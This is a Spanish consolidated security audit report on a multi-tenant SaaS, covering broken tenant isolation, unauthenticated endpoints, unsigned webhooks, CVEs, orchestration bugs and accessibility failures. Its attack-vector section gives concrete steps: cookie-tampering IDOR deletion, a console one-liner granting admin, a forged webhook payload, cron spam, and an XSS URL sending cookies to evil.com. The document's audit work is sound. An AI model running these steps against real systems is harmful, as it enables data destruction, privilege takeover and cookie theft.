---
title: "Deep Findings Summary — Informe Consolidado"
date: 2026-05-19
agent: Consolidator Deep
sources:
  - docs/audit/deep/DA-1-concurrency-orchestrator.md
  - docs/audit/deep/DA-2-auth-rls-deep.md
  - docs/audit/deep/DA-3-security-deep.md
  - docs/audit/deep/DA-4-llm-voice-deep.md
  - docs/audit/deep/DA-5-accessibility.md
  - docs/audit/findings-summary.md
  - docs/audit/05-browser-verification.md
  - docs/audit/05-tokens-exposed.md
---

# Deep Findings Summary — Consolidado Deep Audit

---

## Resumen ejecutivo

El deep audit (DA-1 a DA-5) añade **~116 findings nuevos o profundizados** sobre los 65 del quick scan, elevando la superficie de riesgo total de forma significativa. Los cinco agentes confirman que el sistema tiene tres capas de vulnerabilidad que se refuerzan mutuamente: (1) la capa de autenticación y aislamiento multi-tenant está estructuralmente rota — cualquier usuario autenticado puede leer o destruir datos de cualquier otro tenant con una sola línea de JavaScript; (2) la capa de orquestación BullMQ tiene un bug de firma que hace que el flujo multi-día completo nunca se ejecute en producción, y está sembrada de fallos silenciosos que hacen los leads desaparecer sin rastro; (3) la capa de seguridad perimetral tiene siete endpoints de orquestación completamente abiertos sin autenticación, tres endpoints críticos (`/test/orchestrator`, `/cron/sweep`, `/cron/reminders`) accesibles desde internet, y cero validaciones de firma en los webhooks de Retell.

**Distribución de findings deep (nuevos, no presentes en quick scan):**

| Severidad | DA-1 | DA-2 | DA-3 | DA-4 | DA-5 | Total deep nuevos |
|-----------|------|------|------|------|------|-------------------|
| Critical  | 0    | 6    | 3    | 1    | 0    | **10**            |
| High      | 5    | 8    | 7    | 3    | 9    | **32**            |
| Medium    | 3    | 2    | 3    | 6    | 6    | **20**            |
| Low       | 0    | 0    | 2    | 2    | 1    | **5**             |
| **Total** | **8**| **10+profundizaciones** | **13** | **11** | **24** | **~67 nuevos** |

**Top 5 áreas críticas confirmadas por deep audit:**
1. **Auth/IDOR sistemático** — 9 funciones de inbox, 6 API routes y las server actions de gestión de tenants aceptan UUIDs arbitrarios sin verificar ownership (DA-2).
2. **Orquestador BullMQ completamente roto** — El bug F-02-001 mata todos los pasos encolados; DA-1-005 añade silenciado de errores Redis que hace los jobs desaparecer sin log (DA-1).
3. **Endpoints sin autenticación** — 7 rutas de orquestación, 3 crons y 1 endpoint de test abiertas a internet (DA-2-001, DA-3-001, DA-3-003).
4. **Webhooks sin validación de firma** — 0/6 webhooks con validación completa; Retell tools permite cancelar citas sin auth (DA-3, DA-4-001).
5. **Accesibilidad NON-COMPLIANT** — 6 findings Critical de WCAG 2.1 AA; modales sin focus trap, tablas sin navegación por teclado (DA-5).

**Comparación deep vs quick:** El quick scan había estimado la superficie de ataque correctamente en Security y Multi-tenancy. El deep audit reveló que la superficie es 3-4x mayor: el privilege escalation via `user_metadata` (DA-2-005), el SSRF confirmado en `/api/tenant/migrate` (DA-3-002), el XSS en widget embed (DA-3-004) y los 24 findings de accesibilidad son hallazgos completamente nuevos no cubiertos por el quick scan.

---

## Tabla Critical Top 25

| Rank | ID | Titulo | Archivo:línea | Esfuerzo | Exploitabilidad | Categoría |
|------|----|--------|---------------|----------|-----------------|-----------|
| 1 | F-02-001 (profundizado DA-1) | Worker llama executeSequenceStep con firma incorrecta — flujo multi-día 100% roto | `worker.js:58` | S | Alta — activo en producción | Orquestador |
| 2 | F-05-SEC-001 / F-04-002 (profundizado DA-2) | JWT service_role y anon key hardcodeados en 9 puntos del código fuente | `auth-config.ts:19`, `supabase/server.ts:7`, `actions/tenant.ts:52,76` | S | Crítica — ya expuesto en git | Seguridad |
| 3 | DA-2-001 | API routes de orquestación completamente abiertas (7 endpoints sin auth de sesión) | `api/orchestration/deploy`, `graph`, `publish`, `sweep`, `workflows`, `calls/manual`, `cron/appointments` | M | Alta — accesible desde internet | Auth |
| 4 | DA-2-004 | createTenant / deleteTenant / updateTenant sin verificación de rol admin | `src/lib/actions/tenant.ts:140-197` | S | Alta — cualquier usuario autenticado | Auth/Admin |
| 5 | DA-2-002 | `/api/admin/tenants/[id]/client-sql` descarga SQL de configuración sin ninguna auth | `api/admin/tenants/[id]/client-sql/route.ts` | S | Alta — anónimo | Auth/Exposición |
| 6 | DA-3-001 | Cron endpoints públicos — `/api/orchestration/sweep` y `/api/cron/appointments/reminders` sin auth | `api/orchestration/sweep/route.ts`, `api/cron/appointments/reminders/route.ts` | S | Alta — accesible sin credenciales | Auth |
| 7 | DA-3-002 | SSRF confirmado en `/api/tenant/migrate` via cookie `af-tenant-url` sin allowlist | `api/tenant/migrate/route.ts:247-263` | M | Alta — cookie editable por JS | SSRF |
| 8 | DA-3-003 | Test endpoint abierto en producción — crea leads y workflows reales sin autenticación | `api/test/orchestrator/route.ts` | S (30min) | Alta — anónimo | Auth/Test en Prod |
| 9 | F-04-001 (profundizado DA-2) | fetchCalls sin filtro tenant_id — 4 funciones exponen todos los leads cross-tenant | `src/lib/actions/calls.ts:56-371` | S | Alta — cookie tampering suficiente | Multi-tenancy |
| 10 | DA-2-005 | user_metadata.is_admin editable por el propio usuario — privilege escalation a admin | `src/middleware.ts:62-68` | S | Alta — dos líneas de código en browser | Escalación de privilegios |
| 11 | DA-2-010 | Tabla tenants RLS permite SELECT/INSERT/UPDATE/DELETE para cualquier usuario autenticado | `tenants.sql` (policy `USING(true)` sin filtro) | M | Alta — anon key suficiente | RLS |
| 12 | inbox.ts IDOR sweep (DA-2) | 9 funciones de inbox aceptan UUIDs arbitrarios sin verificar ownership del tenant | `inbox.ts:448-501` | M | Alta — una sola request | IDOR |
| 13 | F-04-004 (profundizado DA-2) | RLS knowledge_base usa `app.current_tenant` que nunca se setea — política dead letter | `migrations/20260424_knowledge_and_billing.sql:28` | S | Alta — RLS inefectiva en prod | RLS |
| 14 | DA-4-001 | Webhook Retell sin verificación de firma — permite falsificar llamadas y manipular CRM | `api/webhooks/retell/route.ts` | S | Alta — HTTP POST público | Webhook/Seguridad |
| 15 | F-02-001 derivado DA-1-005 | enqueueLeadStep silencia errores de Redis — jobs perdidos sin ningún registro | `queue/lead-sequence-queue.ts:106-110` | S | Alta — activo si Redis tiene latencia | Orquestador |
| 16 | DA-2-009 | Webhook CRM sin autenticación — tenant_id spoofing para inyectar leads falsos | `api/webhooks/crm/route.ts:13` | S | Alta — UUID del tenant es suficiente | Webhook |
| 17 | DA-2-006 | Webhook WhatsApp — validación de firma HMAC condicional (omitida si env var no existe) | `api/webhooks/whatsapp/route.ts:37-45` | S | Media — requiere env var ausente | Webhook |
| 18 | DA-2-007 | Webhook Retell tools sin firma — cancelar/agendar citas sin ninguna autenticación | `api/webhooks/retell/tools/route.ts` | M | Alta — HTTP POST público | Webhook |
| 19 | F-02-005/F-03-001 (profundizado) | llm-factory.ts no existe — QualificationProcessor falla en runtime con MODULE_NOT_FOUND | `processors/QualificationProcessor.ts:8` | M | Bloqueante — feature no funciona | LLM/Orquestador |
| 20 | F-03-002 (profundizado DA-4) | Schema `qualified` triplicado y divergente — lógica de cualificación rota end-to-end | `ai-analysis.ts:51`, `fact-extractor.ts:268`, `qualifier.ts` | M | Alta — negocio incorrecto en producción | LLM/Negocio |
| 21 | DA-3-004 | XSS en widget embed — interpolación directa de `id` en JavaScript servido a terceros | `api/widget/embed.js/route.ts:16` | S | Alta — URL pública | XSS |
| 22 | DA-3-006 | Google OAuth tokens almacenados en JSONB plano sin cifrado | `api/integrations/google/callback/route.ts:35-43` | L | Media — requiere acceso a BD | Crypto |
| 23 | DA-3-CVE-002 | next@16.1.6: 19 CVEs (SSRF CVSS 8.6, middleware auth bypass CVSS 8.1) | `package.json` | M | Alta — exploit público disponible | CVE |
| 24 | DA-3-CVE-001 | axios@1.14.0: 15 CVEs (SSRF CVSS 7.2, Prototype Pollution CVSS 7.4) | `package.json` | S | Alta — exploit público disponible | CVE |
| 25 | DA-2-003 | `/api/tenant/migrate` GET sirve MIGRATION_SQL completo sin autenticación | `api/tenant/migrate/route.ts:312-315` | S | Alta — anónimo | Exposición |

---

## High Consolidado

| ID | Titulo | Severidad | Esfuerzo | Agente |
|----|--------|-----------|----------|--------|
| DA-1-001 | Doble conexión Redis (SweepQueue + BullMQ) — abre 3-4 conexiones TCP por proceso | High | S | DA-1 |
| DA-1-002 | getSupabaseServerClient llamado N veces por job — 6+ instancias por executeSequenceStep | High | M | DA-1 |
| DA-1-003 | QualificationProcessor usa API key de variant sin pasar — falla silenciosa si tenant usa Anthropic | High | S | DA-1 |
| DA-1-005 | enqueueLeadStep retorna ID ficticio en error Redis — job perdido sin notificación | High | S | DA-1 |
| DA-2-005 | user_metadata.is_admin editable por usuario — escalación de privilegios a admin | High | S | DA-2 |
| DA-2-006 | WhatsApp webhook firma HMAC condicional — omitida si WHATSAPP_APP_SECRET no está en env | High | S | DA-2 |
| DA-2-007 | Retell tools webhook sin firma — agendamiento/cancelación de citas sin auth | High | M | DA-2 |
| DA-2-008 | service_key de tenant externo en memoria plana sin cifrado (metaCache Map) | High | S | DA-2 |
| DA-2-009 | Webhook CRM — tenant_id spoofing, cualquiera puede inyectar leads a cualquier tenant | High | S | DA-2 |
| F-04-005 (DA-2) | RLS ai_agents/ai_agent_variants tautológica — no filtra por tenant | High | S | DA-2 |
| F-04-006 (DA-2) | RLS web_widgets devuelve todos los tenants | High | S | DA-2 |
| F-04-008 (DA-2) | getPrograms sin filtro tenant_id — expone programas de todos los clientes | High | S | DA-2 |
| DA-3-004 | XSS en widget embed — `id` sin sanitizar inyectable en sitios de terceros | High | S | DA-3 |
| DA-3-005 | Retell tools: endpoint más peligroso — cancela citas reales sin auth | High | M | DA-3 |
| DA-3-006 | Google OAuth tokens en JSONB plano — compromiso de BD expone acceso a Drive/Sheets de clientes | High | L | DA-3 |
| DA-3-007 | Cron reminders expone PII (nombres de leads) en respuesta sin auth | High | S | DA-3 |
| DA-3-CVE-001 | axios@1.14.0 SSRF + Prototype Pollution — 15 CVEs activos | High | S | DA-3 |
| DA-3-CVE-002 | next@16.1.6 SSRF + middleware bypass — 19 CVEs activos | High | M | DA-3 |
| DA-4-002 | Prompt injection indirecto — historial de usuario se inserta en system prompt | High | M | DA-4 |
| DA-4-003 | Tool call arguments sin validación Zod — LLM puede crashear bookings con args null | High | S | DA-4 |
| DA-4-010 | API keys OpenAI visibles en UI dashboard — cualquier user del tenant puede verlas | High | M | DA-4 |
| DA-5-003 | Labels formulario sin htmlFor/id — CreateLeadDialog inaccesible por screen reader | High | M | DA-5 |
| DA-5-004 | Tabla historial `<tr onClick>` sin semántica de teclado | High | M | DA-5 |
| DA-5-006 | `<div onClick>` como selector de agentes — inoperable por teclado | High | S | DA-5 |
| DA-5-008 | Estados de llamada transmitidos solo por color — falla para usuarios con daltonismo | High | M | DA-5 |
| DA-5-010 | Texto con opacity fraccional — contraste < 4.5:1 en 25+ ubicaciones | High | M | DA-5 |
| DA-5-012 | Layout 3-columnas AIAgentInbox sin responsive — inutilizable en mobile | High | L | DA-5 |
| DA-5-016 | outline-none + ring invisible en 187 inputs nativos | High | M | DA-5 |
| DA-5-017 | Sin "skip to main content" — navegación por teclado bloquea en sidebar | High | S | DA-5 |
| DA-5-018 | Todas las páginas del dashboard comparten el mismo título de pestaña | High | M | DA-5 |
| DA-5-021 | Errores de formulario via alert() nativo sin asociación ARIA | High | M | DA-5 |
| DA-5-024 | Sin sistema de notificaciones accesible (toasts/aria-live) | High | M | DA-5 |

---

## Medium / Low (resumen)

**Medium (20 findings nuevos deep):**

- DA-1-004: Circuit breaker duplicado worker.js + orchestrator.ts (doble query Supabase por job)
- DA-1-006: WhatsAppAIProcessor crea `new OpenAI()` por request — sin singleton
- DA-1-007: compliance.ts `isWithinLegalWindow` no verifica sábados en `working_days`
- DA-1-008: feature-flags fail-closed en error de BD — leads descartados silenciosamente durante outages
- DA-2-008: service_key de tenant externo en Map en memoria sin cifrado
- DA-3-008: Math.random() para A/B split — no criptográfico, no reproducible ni auditable
- DA-3-009: Secrets en `docker history` vía ARG build-time — accesibles por quien tenga la imagen
- DA-3-010: `/api/docs/content` sirve MASTER_DOSSIER.md (reglas de negocio) sin auth
- DA-4-004: Chat summary crece indefinidamente — riesgo context overflow y coste descontrolado
- DA-4-007: RescueWorker no pagina — OOM posible con base grande de leads
- DA-4-008: Historial duplicado en llamada OpenAI — 15-30% tokens extra sin beneficio
- DA-4-009: JSON LLM sin validación Zod — tipos incorrectos (string "true" vs boolean true)
- DA-4-011: scheduled_call_confirmed puede persistirse como string — comparación estricta falla
- DA-5-002: SVGs inline sin aria-hidden
- DA-5-005: Jerarquía de headings con saltos y múltiples H1 por página
- DA-5-007: Inputs de auth sin atributo autocomplete
- DA-5-009: Indicador WhatsApp solo por color (punto verde sin texto alternativo)
- DA-5-011: Texto en 8px/9px — extremadamente pequeño, fuera de recomendaciones de legibilidad
- DA-5-019: Icon-only buttons sin aria-label en algunas tablas del calendario
- DA-5-022: Confirmaciones destructivas via window.confirm() nativo

**Low (5 findings nuevos deep):**

- DA-3-011: Timing attack en verificación de WhatsApp verify token con `===` en lugar de `timingSafeEqual`
- DA-4-005: Precios LLM hardcodeados desactualizados (GPT-4 de 2023 vs GPT-4o actual, factor 33×)
- DA-4-006: QualifyAgent.processConversation es stub completo — A/B testing de modelos no funciona
- DA-5-020: Bloques en inglés sin `lang="en"` en IntegrationsManager
- DA-5-013/DA-5-014/DA-5-015/DA-5-023 (Critical en DA-5): modales sin focus trap, sin role=dialog

---

## Cruces nuevos descubiertos en deep

### Cruce 1: Cookie tampering + IDOR → Destrucción cross-tenant verificable

DA-2 confirmó que `af-tenant-id` es una cookie plain (sin HttpOnly, sin firma) modificable desde DevTools. Esta cookie alimenta `getActiveTenantId()` que usan todas las server actions. Al mismo tiempo, 9 funciones de `inbox.ts` aceptan cualquier UUID de lead sin verificar que pertenezca al tenant activo. La combinación es explosiva: un usuario con sesión válida en Tenant A puede:

1. Modificar la cookie a UUID del Tenant B (obtenido via `getTenants()` que devuelve todos los tenants — DA-2-010).
2. Llamar `fetchCalls()` (F-04-001) y obtener todos los leads de B.
3. Usar los UUIDs de leads de B en `deleteLead(uuid)` (que no verifica tenant) y eliminarlos.

**Resultado: destrucción cross-tenant de datos sin privilegios especiales.** Reproducible con browser DevTools. Requiere solo una cuenta registrada en el sistema.

### Cruce 2: Privilege escalation + Server actions de admin = Compromiso total del sistema

DA-2-005 confirmó que `supabase.auth.updateUser({ data: { is_admin: true } })` eleva a cualquier usuario a admin en el middleware. DA-2-004 confirmó que `createTenant`, `deleteTenant` y `updateTenant` no verifican rol admin internamente. Un usuario normal puede:

1. Auto-elevar a admin via `supabase.auth.updateUser()` (dos líneas en la consola del browser).
2. Invocar `deleteTenant(id)` para cualquier tenant UUID conocido.
3. O invocar `createTenant({supabase_url: "https://evil.com", ...})` inyectando credenciales maliciosas.

**Resultado: compromiso administrativo total del SaaS.** No requiere SQL injection ni ningún ataque sofisticado.

### Cruce 3: Retell webhook abierto + QualificationProcessor roto = Doble ceguera en conversiones

DA-4-001 confirmó que el webhook Retell no tiene firma. DA-1 confirmó que QualificationProcessor (el motor de análisis post-llamada) está roto por `llm-factory.ts` faltante. Un atacante puede:

1. POST a `/api/webhooks/retell` con transcripción fabricada de una "llamada exitosa" donde el lead dice ser universitario con 5 años de experiencia.
2. `PostAnalysisService.processInteraction()` actualiza la cualificación del lead con datos fabricados.
3. El lead pasa a `CUALIFICADO` y el CRM se actualiza en Zoho con información falsa.
4. El sistema nunca detecta el fraude porque la cualificación real (QualificationProcessor) nunca funciona.

**Resultado: manipulación de CRM y leads de clientes con datos fabricados.**

### Cruce 4: Bug de firma F-02-001 + enqueueLeadStep silencioso DA-1-005 = Dos vectores de pérdida de leads sin rastro

DA-1 profundizó que F-02-001 hace fallar todos los jobs encolados (step 1 en adelante). Adicionalmente, DA-1-005 descubrió que si Redis tiene cualquier error transitorio durante el enqueue del step 1, `enqueueLeadStep` devuelve un ID ficticio y el caller asume que el job fue encolado. El sistema tiene dos vectores independientes por los que un lead puede quedar congelado en step 0 sin ningún indicador visible: el bug de firma (si Redis funciona) y el silenciado de error Redis (si Redis tiene latencia). Ambos producen el mismo síntoma: el lead recibe la primera interacción pero nunca las siguientes.

### Cruce 5: DA-5 accesibilidad + alert() como UX → Experiencia de usuario completamente rota con tecnología asistiva

DA-5 encontró 10+ instancias de `alert()` para reportar errores y `window.confirm()` para confirmaciones destructivas. Estos diálogos nativos no son controlables por lectores de pantalla como NVDA/JAWS en ciertos modos, bloquean la ejecución JavaScript del frame y no pueden ser personalizados. Al mismo tiempo, los 4 modales principales de la app no tienen `role="dialog"` (DA-5-023) ni focus trap (DA-5-013, DA-5-014). Un usuario de screen reader no puede usar el formulario de creación de leads, no puede navegar el historial y no puede confirmar o cancelar acciones destructivas de forma segura.

---

## Distribución por área

| Área | Quick scan findings | Deep findings nuevos | Total | Veredicto |
|------|---------------------|----------------------|-------|-----------|
| Concurrencia / Orquestador | 18 | 8 (DA-1-001 a DA-1-008) | 26 | Bloqueante — flujo multi-día roto |
| Auth / RLS | 13 | 10 (DA-2-001 a DA-2-010) | 23 | Crítico — aislamiento roto sistémicamente |
| Seguridad perimetral | 20 | 13 (DA-3-001 a DA-3-CVE-002) | 33 | Crítico — superficie enorme sin proteger |
| LLM / Voz / Costes | 12 | 11 (DA-4-001 a DA-4-011) | 23 | Alto — cualificación y costes rotos |
| Accesibilidad WCAG | 0 (no auditado) | 24 (DA-5-001 a DA-5-024) | 24 | NON-COMPLIANT — 6 Critical |
| **Total** | **65** | **~67** | **~129** | **Sistema en riesgo activo** |

---

## Vectores de ataque end-to-end

### Vector 1: Destrucción de datos de cliente rival (ataque IDOR completo)

**Escenario:** Un competidor de Esden o un cliente descontento con cuenta válida quiere borrar leads de otro cliente.

**Flujo:**
1. Atacante se registra o tiene cuenta legítima (Tenant-A).
2. Abre DevTools → Console → `fetch('/api/action-...', { method: 'POST', body: ... })` o directamente invoca `getTenants()` via server action que devuelve todos los UUIDs de tenants (DA-2-010, policy `USING(true)`).
3. Obtiene UUID del Tenant-B objetivo.
4. Modifica cookie: `document.cookie = "af-tenant-id=<UUID-Tenant-B>; path=/"` (cookie plain, sin protección).
5. Invoca `fetchCalls()` — devuelve todos los leads de Tenant-B (F-04-001, sin filtro tenant).
6. Con los UUIDs de leads de B, invoca `deleteLead(leadId)` repetidamente — la función no verifica que el lead pertenezca al tenant activo.
7. **Impacto: todos los leads de Tenant-B eliminados con cascade en BD.** Sin log, sin alerta, sin reversión.

**Prerequisitos:** Una cuenta válida en el sistema. Tiempo estimado de ejecución: 15 minutos.

### Vector 2: Compromiso administrativo total del SaaS (privilege escalation)

**Escenario:** Un usuario con cuenta básica quiere tomar control de la plataforma.

**Flujo:**
1. Usuario con sesión activa abre DevTools → Console.
2. Ejecuta: `(await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm')).createClient(SUPABASE_URL, ANON_KEY).auth.updateUser({ data: { is_admin: true } })` — o usa el cliente ya instanciado en la app.
3. `user_metadata.is_admin = true` — el middleware lo acepta como admin (DA-2-005).
4. Navega a `/dashboard/settings` — ahora tiene acceso completo de administrador.
5. Invoca `deleteTenant(uuid)` para cualquier tenant, o `updateTenant(uuid, { supabase_url: 'https://evil.com' })` para redirigir datos a servidor controlado.
6. **Impacto: eliminación de tenants o robo de datos de todos los clientes.**

### Vector 3: Inyección de llamadas falsas y manipulación del CRM (Retell spoofing)

**Escenario:** Un actor con acceso a información de leads quiere calificar fraudulentamente a un lead o contaminar el CRM.

**Flujo:**
1. Atacante obtiene `tenant_id` y `lead_id` válidos (disponibles via múltiples vectores, incluyendo el endpoint abierto de orchestration).
2. POST a `https://app.linkstation.ai/api/webhooks/retell` con payload simulando llamada exitosa: `{ call: { metadata: { tenant_id: "uuid", lead_id: "uuid" } }, transcript: "Usuario: Tengo grado universitario y 5 años de experiencia..." }`.
3. Sin validación de firma (DA-4-001), el webhook acepta el payload.
4. `PostAnalysisService.processInteraction()` analiza la transcripción fabricada con OpenAI y determina `qualified = "si"`.
5. El lead pasa a `CUALIFICADO` en la BD y el CRM de Zoho se actualiza.
6. **Impacto: manipulación de pipeline de ventas, leads falsos calificados, posibles citas agendadas con números reales.**

### Vector 4: Ejecución arbitraria del orquestador desde internet (cron abuse)

**Escenario:** Actor externo quiere forzar el envío masivo de mensajes WhatsApp o ejecutar el sweep del orquestador repetidamente.

**Flujo:**
1. GET a `https://app.linkstation.ai/api/cron/appointments/reminders` — sin ninguna autenticación (DA-3-001).
2. El endpoint envía recordatorios WhatsApp a TODOS los leads con citas de TODOS los tenants.
3. La respuesta incluye nombres de leads (PII) y estados de envío.
4. Repetir cada pocos minutos → spam masivo a todos los clientes de todos los tenants.
5. Alternativamente, GET a `/api/orchestration/sweep` → ejecuta el orquestador global, potencialmente disparando acciones de todos los tenants antes de tiempo.
6. **Impacto: spam a base de datos de leads de clientes, posibles costes de WhatsApp Business API, PII expuesta en respuestas.**

### Vector 5: XSS en sitios de clientes via widget embed (impacto a terceros)

**Escenario:** Un atacante quiere ejecutar JavaScript en el sitio web de los clientes de Esden que han embebido el widget de chat.

**Flujo:**
1. Un cliente de Esden embebe el widget con `<script src="https://app.linkstation.ai/api/widget/embed.js?id=<uuid>">`.
2. Atacante convence al cliente de usar una URL con `id` malicioso, o explota un XSS previo para cambiar el src.
3. URL: `.../api/widget/embed.js?id="%3B%20fetch('https://evil.com?c='+document.cookie)%3B%20var%20x%3D"`
4. El script resultante roba cookies de todos los visitantes del sitio del cliente.
5. **Impacto: comprometidos los visitantes (usuarios finales) de los sitios web de los clientes de Esden.**

---

## Status final

**Estado global: EN RIESGO ACTIVO.** Hay exploits reproducibles sin conocimiento técnico avanzado que permiten destruir datos de clientes, escalar privilegios a administrador y manipular el CRM. Se requiere intervención urgente antes de cualquier despliegue adicional.

**Status:** DONE
**Summary:** Consolidación de 5 deep audits. ~67 findings nuevos sobre los 65 del quick scan (~129 total). Los 5 vectores de ataque end-to-end son reproducibles. Prioridad de intervención: (1) rotar credenciales comprometidas, (2) añadir auth a 7 API routes de orquestación + 3 endpoints de cron/test, (3) fix IDOR en 9 funciones de inbox, (4) fix bug de firma en worker.js.
